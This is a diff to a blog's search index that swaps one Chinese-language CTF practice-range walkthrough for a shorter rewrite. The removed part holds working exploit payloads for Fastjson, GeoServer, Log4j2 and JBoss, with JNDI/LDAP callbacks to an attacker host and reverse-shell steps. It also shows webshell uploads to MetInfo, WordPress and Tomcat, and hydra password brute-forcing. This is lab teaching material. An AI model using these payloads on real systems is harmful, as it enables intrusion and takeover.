@@ -2051,155 +2051,6 @@
       </tags>
   </entry>
   <entry>
-    <title>极核靶场通关</title>
-    <url>/2025/02/15/%E6%9E%81%E6%A0%B8%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/</url>
-    <content><![CDATA[<h2 id="Mysql-密码爆破"><a href="#Mysql-密码爆破" class="headerlink" title="Mysql - 密码爆破"></a>Mysql - 密码爆破</h2><p>已经指定目标用户名为 root，使用 hydra 工具爆破密码</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://node.hackhub.get-shell.com:51236 -t 4</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://tc-new.z.wiki/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20251003/Ofp2/1403X437/assets/network-asset-1738285053840-242ea2b0-2c15-4bb4-910f-fe98534b95cc-20250131211154-ikmicqf.png"></p>
-<p>爆破得到密码，使用数据库工具（例如 Navicat）连接即可找到 flag</p>
-<h2 id="SSH-密码爆破"><a href="#SSH-密码爆破" class="headerlink" title="SSH - 密码爆破"></a>SSH - 密码爆破</h2><p>给出的默认用户名是 user，仍然使用 hydra 工具爆破密码</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://node.hackhub.get-shell.com:62621 -t 4</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://tc-new.z.wiki/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20251003/AA5V/1421X421/assets/network-asset-1738285274418-d1ab7532-961f-4a6b-ac2a-968976082d2f-20250131211154-r64xa5x.png"></p>
-<p>爆破得到密码，ssh 工具连接，直接读 flag 发现没有权限，root 密码不知道，但是我们知道 user 的密码，使用 sudo 执行命令，输入 user 密码，即可得到 flag</p>
-<h2 id="Fastjson-1-2-47-远程代码执行"><a href="#Fastjson-1-2-47-远程代码执行" class="headerlink" title="Fastjson 1.2.47 - 远程代码执行"></a>Fastjson 1.2.47 - 远程代码执行</h2><p>在登陆处抓包，发现账号密码是通过 json 进行数据传输</p>
-<p>构造 POST 数据，删除末尾的大括号使其报错，发现是标准的 fastjson 后端</p>
-<p><img src="https://tc-new.z.wiki/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20251003/XK7N/1827X937/assets/network-asset-1738286428503-211e494e-c2c4-45a7-8d80-afeeaaaef028-20250131211154-341698y.png">
-POST 发送如下数据包，在 dnslog 上接收到请求，证明漏洞存在</p>
-<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.net.Inet4Address&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;3mqyx3.dnslog.cn&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://tc-new.z.wiki/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20251003/Dm3y/1241X224/assets/network-asset-1738286657428-aaf0d66b-a694-45f0-af25-ded66fe3717a-20250131211154-yo83vam.png"></p>
-<p>利用报错查看精确版本号，fastjson1.2.47，网上自己找找相关漏洞文章</p>
-<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.AutoCloseable&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://tc-new.z.wiki/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20251003/w4m5/1830X884/assets/network-asset-1738286779202-c9b95403-2f81-4a80-9076-e21b5477ca9a-20250131211154-7nm8q8x.png"></p>
-<p>通过恶意 JNDI 地址让靶机加载并执行远程代码，这里执行的反弹命令必须是 nc，没有 bash</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C <span class="string">&quot;想要执行的命令&quot;</span> -A <span class="string">&quot;攻击机的ip&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>将生成的 JNDI 地址写入 POST 数据包对应位置，攻击机开启监听，发送数据包，即可拿到 shell</p>
-<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;a&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;b&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://ip:port/wwsebk&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://tc-new.z.wiki/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20251003/GzHB/1092X225/assets/network-asset-1738287937546-c236af75-f639-41bc-819b-46221242e2e2-20250131211154-e5i9u83.png"></p>
-<h2 id="GeoServer-远程代码执行"><a href="#GeoServer-远程代码执行" class="headerlink" title="GeoServer - 远程代码执行"></a>GeoServer - 远程代码执行</h2><p>进入 geoserver 首页，先抓个包，POST 方式在 <code>/geoserver/wfs</code> 路由提交以下数据反弹 shell</p>
-<p>需要修改一下 Content-Type 为 <code>application/xml</code></p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">wfs:GetPropertyValue</span> <span class="attr">service</span>=<span class="string">&#x27;WFS&#x27;</span> <span class="attr">version</span>=<span class="string">&#x27;2.0.0&#x27;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xmlns:topp</span>=<span class="string">&#x27;http://www.openplans.org/topp&#x27;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xmlns:fes</span>=<span class="string">&#x27;http://www.opengis.net/fes/2.0&#x27;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xmlns:wfs</span>=<span class="string">&#x27;http://www.opengis.net/wfs/2.0&#x27;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">wfs:Query</span> <span class="attr">typeNames</span>=<span class="string">&#x27;sf:archsites&#x27;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">wfs:valueReference</span>&gt;</span>exec(java.lang.Runtime.getRuntime(),&#x27;反弹shell命令&#x27;)<span class="tag">&lt;/<span class="name">wfs:valueReference</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">wfs:GetPropertyValue</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://tc-new.z.wiki/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20251003/MCok/1443X296/assets/network-asset-1738288569748-8508de28-8b88-4db8-b590-90a67cea301a-20250131211154-kac33gn.png"></p>
-<h2 id="Log4j2-远程代码执行"><a href="#Log4j2-远程代码执行" class="headerlink" title="Log4j2 - 远程代码执行"></a>Log4j2 - 远程代码执行</h2><p>首先利用 dnslog 判断漏洞是否存在，同时探测一下 java 版本</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/solr/admin/cores?action=$&#123;jndi:ldap://$&#123;sys:java.version&#125;.f9dvag.dnslog.cn&#125;</span><br></pre></td></tr></table></figure>
-
-<p>dnslog 收到请求，漏洞存在，同时判断出 java 版本是 1.8</p>
-<p><img src="https://tc-new.z.wiki/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20251003/6l7k/1262X196/assets/network-asset-1738290833075-db8bbaa6-e3f7-4fb9-a382-ee4d1ebea7eb-20250131211154-ivpsfkp.png"></p>
-<p>然后还是使用 JNDI 注入工具生成恶意 JNDI 地址，执行反弹 shell 命令</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C <span class="string">&quot;想要执行的命令&quot;</span> -A <span class="string">&quot;攻击机的ip&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>将生成的地址填入以下 payload 对应位置，同时攻击机开启监听</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/solr/admin/cores?action=$&#123;jndi:ldap://ip:port/flnl6n&#125;</span><br></pre></td></tr></table></figure>
-
-<p>成功拿到 shell，得到 flag</p>
-<p><img src="https://tc-new.z.wiki/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20251003/Mb1z/1264X211/assets/network-asset-1738291010768-a90e4149-6385-4372-baf1-8b827a4d95d9-20250131211154-1n9xsv8.png"></p>
-<h2 id="MetInfo-4-0"><a href="#MetInfo-4-0" class="headerlink" title="MetInfo 4.0"></a>MetInfo 4.0</h2><p>MetInfo 4.0 存在一个修改任意用户密码的漏洞，先注册一个用户登陆，登陆后抓一个修改信息的包，将用户名修改为 admin，重放，提示操作成功，此时我们已经将管理员的信息修改为原本注册账号的信息了</p>
-<p><img src="https://tc-new.z.wiki/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20251003/AVx7/1783X690/assets/network-asset-1738312866197-3bb315f4-5ca5-45e3-aac8-5d2a2e0dc5cf-20250131211154-sdelqu4.png"></p>
-<p>访问 <code>/admin/</code> 目录进入后台，管理员账号密码是刚修改的</p>
-<p>写一个一句话木马，打包成压缩包，在界面风格-&gt;模板管理-&gt;添加新模板处上传木马压缩包，上传后会自动将压缩包里面的 shell.php 文件解压到网站的 <code>/templates/</code> 目录下</p>
-<p><img src="https://tc-new.z.wiki/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20251003/nQjF/1537X492/assets/network-asset-1738314244373-7ea8efc6-471b-4db8-8941-170533e0f087-20250131211154-btmyadq.png"></p>
-<p>蚁剑成功连接，根目录找到 flag</p>
-<h2 id="Shiro550-Shiro反序列化"><a href="#Shiro550-Shiro反序列化" class="headerlink" title="Shiro550 - Shiro反序列化"></a>Shiro550 - Shiro反序列化</h2><p>特征是勾选记住密码后，登陆响应包中有 <code>Set-Cookie: rememberMe=deleteMe;</code> 字段</p>
-<p>使用 Shiro 反序列化工具一把梭</p>
-<p><img src="https://tc-new.z.wiki/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20251003/otvG/1489X843/assets/network-asset-1738314396481-a643278a-f0e3-4c93-9100-9865aa5db220-20250131211154-kk3f8iu.png"></p>
-<h2 id="SpringBoot-信息泄露"><a href="#SpringBoot-信息泄露" class="headerlink" title="SpringBoot - 信息泄露"></a>SpringBoot - 信息泄露</h2><p>主界面什么都没有，dirsearch 扫一下目录</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -u <span class="string">&quot;http://node.hackhub.get-shell.com:55748/&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://tc-new.z.wiki/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20251003/jUS0/1546X612/assets/network-asset-1738328182523-30754daf-63ee-49c1-8b04-101ae06bf79d-20250131211155-da1w1w3.png"></p>
-<p>发现 <code>/admin</code> 路由是后台地址，<code>/actuator</code> 路由是所有存在的断点</p>
-<p>访问 <code>/actuator/env</code> 发现网站用户名 webadmin</p>
-<p>下载 JAVA 堆栈文件 heapdump，使用工具 JDumpSpider 提取敏感信息，命令如下：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar .\JDumpSpider.jar .\heapdump</span><br></pre></td></tr></table></figure>
-
-<p>得到后台账号密码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin.username = webadmin</span><br><span class="line">admin.password = adminweb</span><br></pre></td></tr></table></figure>
-
-<p>访问 <code>/admin/</code> 路由登陆后台即可得到 flag</p>
-<h2 id="ThinkPHP-5-0-23-远程代码执行"><a href="#ThinkPHP-5-0-23-远程代码执行" class="headerlink" title="ThinkPHP 5.0.23 - 远程代码执行"></a>ThinkPHP 5.0.23 - 远程代码执行</h2><p>thinkphp 综合利用工具一把梭</p>
-<p><img src="https://tc-new.z.wiki/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20251003/XQt6/1803X998/assets/network-asset-1738314672355-c643567f-5c6b-43cf-93e1-de4aaae5e9f5-20250131211155-nxcf6jg.png"></p>
-<h2 id="WordPress-“花咲雨町”"><a href="#WordPress-“花咲雨町”" class="headerlink" title="WordPress - “花咲雨町”"></a>WordPress - “花咲雨町”</h2><p>靶机搭建的应用程序是 WordPress，在 <code>/wp-json/wp/v2/users API</code> 端点可以查看用户列表，访问发现只有一个用户，用户名为 webadmin</p>
-<p>在 <code>xmlrpc.php</code> 文件下通过 POST 方式发送数据，查询可以使用哪些方法</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">methodCall</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">methodName</span>&gt;</span>system.listMethods<span class="tag">&lt;/<span class="name">methodName</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">params</span>&gt;</span><span class="tag">&lt;/<span class="name">params</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">methodCall</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>发现有很多方法可以用，使用 wp.getUsersBlogs 方法来爆破密码，数据包如下</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">methodCall</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">methodName</span>&gt;</span>wp.getUsersBlogs<span class="tag">&lt;/<span class="name">methodName</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">params</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span>&gt;</span><span class="tag">&lt;<span class="name">value</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">value</span>&gt;</span><span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span>&gt;</span><span class="tag">&lt;<span class="name">value</span>&gt;</span>password<span class="tag">&lt;/<span class="name">value</span>&gt;</span><span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">params</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">methodCall</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://tc-new.z.wiki/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20251003/kHwx/1848X904/assets/network-asset-1738318858850-1a614923-098b-4652-9b0f-1ebff112cda3-20250131211155-780ah34.png"></p>
-<p>爆破得到密码为 admin123，登陆后台，在后台管理-&gt;插件-&gt;上传插件处上传我们下载好的插件</p>
-<p>在 WordPress 官方地址下载插件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://cn.wordpress.org/plugins/</span><br></pre></td></tr></table></figure>
-
-<p>随便下载一个然后在插件目录下写一个 shell.php，再重新打包上传到后台插件处上传</p>
-<p><img src="https://tc-new.z.wiki/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20251003/BBYq/1525X575/assets/network-asset-1738319462796-6ff9561d-9d08-4e50-92c2-0d6b1e40d6e2-20250131211155-gsqvgdn.png"></p>
-<p>启用插件，查看可以看到插件已经成功加载，shell.php 文件也存在</p>
-<p><img src="https://tc-new.z.wiki/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20251003/7yGE/1964X1042/assets/network-asset-1738319749946-7353cf1c-6744-46b4-b0c4-48596a2def7b-20250131211155-63xucev.png"></p>
-<p>WordPress 的插件目录在 <code>/wp-content/plugins/</code>，后面加上自己下载的插件目录和木马名，蚁剑连接成功，在根目录下得到 flag</p>
-<p><img src="https://tc-new.z.wiki/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20251003/QLZx/1545X1043/assets/network-asset-1738319928376-ef343d09-48ad-4319-b5b6-a83949996e32-20250131211155-1wxw5cd.png"></p>
-<h2 id="哪吒监控"><a href="#哪吒监控" class="headerlink" title="哪吒监控"></a>哪吒监控</h2><p>默认账号密码 <code>admin/admin</code> 登陆，直接进入命令行执行命令</p>
-<p><img src="https://tc-new.z.wiki/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20251003/lpMf/1952X773/assets/network-asset-1738315296911-898585a1-9c67-4379-9db4-3e3004de72fd-20250131211155-yddrgc1.png"></p>
-<h2 id="彩虹目录列表"><a href="#彩虹目录列表" class="headerlink" title="彩虹目录列表"></a>彩虹目录列表</h2><p>进入后台管理，弱口令爆破得到账号密码为 <code>admin/123456</code>， 登陆后台后进入首页可以任意上传文件</p>
-<p><img src="https://tc-new.z.wiki/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20251003/A59A/1962X1220/assets/network-asset-1738315937668-5ecda6fe-cb7f-4905-82b2-3aec6b5ae50d-20250131211155-abh8iyh.png"></p>
-<p>直接上传一句话木马，访问连接即可</p>
-<h2 id="朵米客服平台"><a href="#朵米客服平台" class="headerlink" title="朵米客服平台"></a>朵米客服平台</h2><p>首先注册登陆进入后台，在后台系统设置-&gt;广告设置处可以上传图片，bp 抓一个上传文件的包</p>
-<p>修改 POST 数据包，将 <code>data:image/jpeg</code> 更改为 <code>data:image/php</code>，base64 的内容替换为 base64 编码的一句话木马，成功上传</p>
-<p><img src="https://tc-new.z.wiki/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20251003/WlD0/1830X731/assets/network-asset-1738317666507-e33ed717-e792-4566-a90b-2b14d401aa15-20250131211155-4etiooo.png"></p>
-<p>拼接 url 地址，蚁剑成功连接，根目录下找到 flag</p>
-<p><img src="https://tc-new.z.wiki/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20251003/cKWF/1545X1041/assets/network-asset-1738317697071-604807a4-803c-4e25-ad7f-5f3a950ce279-20250131211155-imakmbr.png"></p>
-<h2 id="Git-目录信息泄露"><a href="#Git-目录信息泄露" class="headerlink" title=".Git - 目录信息泄露"></a>.Git - 目录信息泄露</h2><p>使用 dirsearch 目录扫描，发现存在 <code>.git</code> 目录，目录下还有很多文件</p>
-<p><img src="https://tc-new.z.wiki/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20251003/qDm7/1823X866/assets/image-20251002181714-43li9m1.png"></p>
-<p>先使用 githacker 将 <code>.git</code> 目录打包下载下来，然后使用 lazygit 工具查看之前的提交，得到 flag</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">githacker --url http://example.com/.git/ --output-folder result</span><br><span class="line">lazygit</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://tc-new.z.wiki/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20251003/ex7g/2112X1116/assets/image-20251002182746-z9c8afn.png"></p>
-<h2 id="Alist-粗心的配置"><a href="#Alist-粗心的配置" class="headerlink" title="Alist - 粗心的配置"></a>Alist - 粗心的配置</h2><p>访问靶机，是一些文件，将 <code>.bash_history</code> 文件下载下来，发现里面写有账号密码信息，admin&#x2F;123456</p>
-<p>登陆后即可管理存储信息，将页面显示的文件由 <code>/root</code> 改为 <code>/</code> 下的文件，保存</p>
-<p><img src="https://tc-new.z.wiki/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20251003/06Fm/2017X1029/assets/image-20251002184146-fv24w7f.png"></p>
-<p>再次访问主界面就可以看到机器根目录下的文件，得到 flag</p>
-<p><img src="https://tc-new.z.wiki/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20251003/lHZZ/2019X1099/assets/image-20251002184403-gs3t8fw.png"></p>
-<h2 id="Druid-未授权登录爆破"><a href="#Druid-未授权登录爆破" class="headerlink" title="Druid - 未授权登录爆破"></a>Druid - 未授权登录爆破</h2><p>点击数据看板，提示 <code>Hi，这是一个API接口，看看API路径有什么吧！</code></p>
-<p><img src="https://tc-new.z.wiki/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20251003/eOzi/2022X1094/assets/image-20251003082429-nberk1y.png"></p>
-<p>根据提示，我们对 <code>/api/</code> 目录进行爆破，扫到 druid 的登陆界面 <code>/api/druid/login.html</code></p>
-<p><img src="https://tc-new.z.wiki/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20251003/10L9/1827X465/assets/image-20251003082734-oxtqf9k.png"></p>
-<p>猜测账号名为 <code>druid</code>，弱口令爆破得到账号密码 <code>druid/123456</code>，登陆进去即可得到 flag</p>
-<h2 id="JBoss"><a href="#JBoss" class="headerlink" title="JBoss"></a>JBoss</h2><p>题目提示存在 CVE-2017-7504 反序列化漏洞</p>
-<p>访问 <code>/jbossmq-httpil/HTTPServerILServlet</code>，出现如下界面，说明漏洞存在</p>
-<p><img src="https://tc-new.z.wiki/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20251003/Y6BN/2030X1088/assets/image-20251003084310-le25sm3.png"></p>
-<p>手工没复现出来不知道什么原因，shell 一直弹不上，这里直接工具一把梭了</p>
-<p><img src="https://tc-new.z.wiki/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20251003/PPzU/964X366/assets/image-20251003090027-txuh69h.png"></p>
-<h2 id="JWT-Token-垂直越权漏洞"><a href="#JWT-Token-垂直越权漏洞" class="headerlink" title="JWT Token - 垂直越权漏洞"></a>JWT Token - 垂直越权漏洞</h2><p>在 cookie 中拿到 jwt，使用的是 HS256 算法，爆破拿到密钥 123456，修改 login_user_key 字段为 admin，再重新加密，将重新加密后的 jwt 放入cookie 中，刷新即可进入管理员界面</p>
-<p><img src="https://tc-new.z.wiki/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20251003/h6l7/2002X1172/assets/image-20251003092254-jiajb1u.png"></p>
-<p>进入后台之后，根据提示，在 用户管理-&gt;备注 中拿到 flag</p>
-<p><img src="https://tc-new.z.wiki/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20251003/VpFa/2029X1030/assets/image-20251003092137-8ef6s8q.png"></p>
-<h2 id="Nacos"><a href="#Nacos" class="headerlink" title="Nacos"></a>Nacos</h2><p>进入后显示 404，拼接 <code>/nacos</code> 路由进入登陆界面</p>
-<p>测试发现可以未授权查看用户信息，拼接如下路由即可看到系统中的登陆用户，得到 flag</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/nacos/v1/auth/users?pageNo=1&amp;pageSize=10</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://tc-new.z.wiki/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20251003/mLPD/2013X595/assets/image-20251003092545-2wuxrmp.png"></p>
-<h2 id="Tomcat-Manager-恶意文件上传"><a href="#Tomcat-Manager-恶意文件上传" class="headerlink" title="Tomcat Manager - 恶意文件上传"></a>Tomcat Manager - 恶意文件上传</h2><p>弱口令 <code>tomcat/tomcat</code> 登陆后台，后台处可以上传恶意的 war 文件</p>
-<p><img src="https://tc-new.z.wiki/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20251003/X1oG/1983X199/assets/image-20251003092957-hzuuxr7.png"></p>
-<p>将天蝎权限管理工具自带的 jsp webshell 压缩，得到恶意 war 文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jar cvf api.war api.jsp</span><br></pre></td></tr></table></figure>
-
-<p>上传该 war 文件，访问 <code>/api/api.jsp</code> 路由，发现成功解析，天蝎成功连接，拿到 flag</p>
-<p><img src="https://tc-new.z.wiki/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20251003/snVj/1460X398/assets/image-20251003093438-mvfckao.png"></p>
-<h2 id="Vite开发服务器-任意文件读取"><a href="#Vite开发服务器-任意文件读取" class="headerlink" title="Vite开发服务器 - 任意文件读取"></a>Vite开发服务器 - 任意文件读取</h2><p>CVE-2025-30208，利用非常简单，直接拼接 <code>/@fs/flag?import&amp;raw??</code> 即可拿到 flag</p>
-<p><img src="https://tc-new.z.wiki/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20251003/Tr29/2020X273/assets/image-20251003093817-1zv5nto.png"></p>
-<p>‍</p>
-]]></content>
-      <categories>
-        <category>靶场通关</category>
-      </categories>
-      <tags>
-        <tag>靶场通关</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>2025-H&amp;NCTF WP</title>
     <url>/2025/06/16/2025-H&amp;NCTF%20WP/</url>
     <content><![CDATA[<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="乱成一锅粥了"><a href="#乱成一锅粥了" class="headerlink" title="乱成一锅粥了"></a>乱成一锅粥了</h2><p>题目给了一个流量包，wireshark 打开，导出 HTTP 对象，可以看到有一些 zip，将它们导出来，每个压缩包里都有 50 个以 md5 命名的 txt 文件，里面是一些 base64 字符串</p>
@@ -5218,6 +5069,174 @@ flag为这些答案总和的md5（以<a href="https://cyberchef.org/%E7%BD%91%E7
       </categories>
       <tags>
         <tag>CTF-WP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>极核渗透测试靶场</title>
+    <url>/2025/02/15/%E6%9E%81%E6%A0%B8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%B6%E5%9C%BA/</url>
+    <content><![CDATA[<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Mysql-密码爆破"><a href="#Mysql-密码爆破" class="headerlink" title="Mysql - 密码爆破"></a>Mysql - 密码爆破</h2><p>已经指定目标用户名为 root，使用 hydra 工具爆破密码</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://node.hackhub.get-shell.com:51236</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic8.fukit.cn/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260109/gCRn/1403X437/assets/network-asset-1738285053840-242ea2b0-2c15-4bb4-910f-fe98534b95cc-20250131211154-ikmicqf.png"></p>
+<p>爆破得到密码，使用 Navicat 连接即可找到 flag</p>
+<h2 id="SSH-密码爆破"><a href="#SSH-密码爆破" class="headerlink" title="SSH - 密码爆破"></a>SSH - 密码爆破</h2><p>给出的默认用户名是 user，仍然使用 hydra 工具爆破密码</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://node.hackhub.get-shell.com:62621</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic8.fukit.cn/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260109/qZUW/1421X421/assets/network-asset-1738285274418-d1ab7532-961f-4a6b-ac2a-968976082d2f-20250131211154-r64xa5x.png"></p>
+<p>爆破得到密码，ssh 工具连接，直接读 flag 发现没有权限，root 密码不知道，但是我们知道 user 的密码，使用 sudo 执行命令，输入 user 密码，即可得到 flag</p>
+<h2 id="MSSQL-密码爆破"><a href="#MSSQL-密码爆破" class="headerlink" title="MSSQL - 密码爆破"></a>MSSQL - 密码爆破</h2><p>mssql 数据库的默认管理员用户是 sa，使用 hydra 工具爆破密码（好久没用了，感觉现在爆破好慢</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -l sa -P /usr/share/wordlists/rockyou-top15000.txt mssql://node.hackhub.get-shell.com:44155 -t 64</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic8.fukit.cn/autoupload/JzKGvcr2-C5XkMEml_gM2diO_OyvX7mIgxFBfDMDErs/20260109/Y77B/1676X408/assets/image-20260108212853-joq1rrv.png" alt="image"></p>
+<p>爆破出 sa 用户的密码后，使用 Navicat 连接即可得到 flag</p>
